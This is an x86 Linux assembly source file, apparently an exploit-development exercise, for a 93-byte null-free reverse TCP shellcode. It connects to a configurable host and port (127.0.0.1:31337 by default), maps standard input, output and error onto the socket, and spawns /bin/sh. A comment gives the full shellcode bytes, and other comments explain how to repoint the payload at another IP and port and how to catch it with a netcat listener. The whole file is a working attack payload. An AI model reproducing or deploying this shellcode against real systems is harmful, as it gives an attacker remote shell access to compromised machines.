; This assembly code connects to 127.0.0.1:31337 and sends a local /bin/sh to it
; 
; create elf32 executable with: ./compile.sh reverse_tcp_shellcode
;
; You can then test this with: nc -nlvp 31337
;
; some nifty details
; -^- 93 bytes
; -^- zero zero's
; -^- change remote port: end of shellcode (bytes 1+2 of the last 6 bytes) !
; -^- change remote ip:   end of shellcode (bytes 3-6 of the last 6 bytes) !

; full shellcode bytes:
;
; "\xeb\x50\x5d\x31\xc0\xb0\x66\x31\xdb\x43\x31\xf6\x56\x53\x6a\x02"
; "\x89\xe1\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80"
; "\x49\x79\xf9\xb0\x66\xb3\x03\xff\x75\x02\x66\xff\x75\x00\x66\x6a"
; "\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x0b\x56\x68\x2f"
; "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x56\x53\x89\xe1\x89\xf2"
; "\xcd\x80\xe8\xab\xff\xff\xff"
; "\x7a\x69"                        ; PORT = 0x7A69 = 31337
; "\x7f\x00\x00\x01"                ;   IP = 127.0.0.1
;

section .text
global _start

_start:

    jmp short set_port

rocknroll:
    pop ebp                 ; pop the config struct (see end-of-code)
                            ; offset 0: port (2 bytes), default 31337
                            ; offset 2: ip address (4 bytes), default 127.0.0.1

    ; first: create a socket
    ; int fd = socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0) 

    xor eax, eax
    mov al, 102             ; eax: syscall 102: socketcall

    xor ebx, ebx
    inc ebx                 ; ebx: call = 1 (sys_socket)

    xor esi,esi             ; we'll use esi to be our alway-zero-shellcode-bytesaver :-)

    push esi                ; protocol: 0   = IPPROTO_IP
    push ebx                ; type:     1   = SOCK_STREAM
    push byte 0x2           ; domain:   2   = AF_INET

    mov ecx,esp             ; ecx: args array structure
    int 0x80                ; trigger syscall

    ; save the socketfd

    mov edi, eax

    ; now create copies of the 3 file descriptions 0 = STDIN, 1 = STDOUT, 2 = STDERR
    ; and map them to our new socket's fd
    ; int dup2(int oldfd, int newfd);

    mov ebx, edi            ; socket fd
    xor ecx, ecx
    mov cl,0x2
loop:
    mov al, 63              ; dup2 syscall
    int 0x80
    dec ecx                 ; decrement until 0 to do (2->1->0)
    jns loop

    ; Connect our fd (socket) to a remote host/port
    ;
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; connect(sockfd, [AF_INET, 31337, 127.1.1.1], 16)

    mov al, 102             ; eax: syscall 102: socketcall
    mov bl, 3               ; ebx: call = 3 (sys_connect)

    ; build struct to connect to remote host

    push dword [ebp+2]      ; get ip address from JMP-CALL-POP ebp
    push word [ebp]         ; get port (word, in reverse order)
    push WORD 0x2           ; AF_INET = 2 (word)
    mov ecx, esp            ; ecx: args array structure

    ; syscall arg build
    push 16                 ; sockaddr struct size = 16
    push ecx                ; struct addr
    push edi                ; our socket's fd

    mov ecx, esp            ; into 2nd arg (ecx)

    int 0x80

    ; finally, execve /bin//sh
    ; int execve(const char *filename, char *const argv[],
    ;            char *const envp[]);

    mov al, 11              ; execve syscall 

    push esi                ; NULL terminator
    push dword 0x68732f2f   ; "//sh"
    push dword 0x6e69622f   ; "/bin"
    mov ebx,esp             ; filename = "/bin//sh\x0"

    push esi
    push ebx
    mov ecx, esp            ; argv = [filename, 0] 

    mov edx, esi            ; envp = NULL

    int 0x80                ; trigger syscall -> hello shell!

set_port:
    call rocknroll

    port: db 0x7a, 0x69     ; port 31337 (0x7a69)
    ip:   db 127,0,0,1      ; ip 127.0.0.1
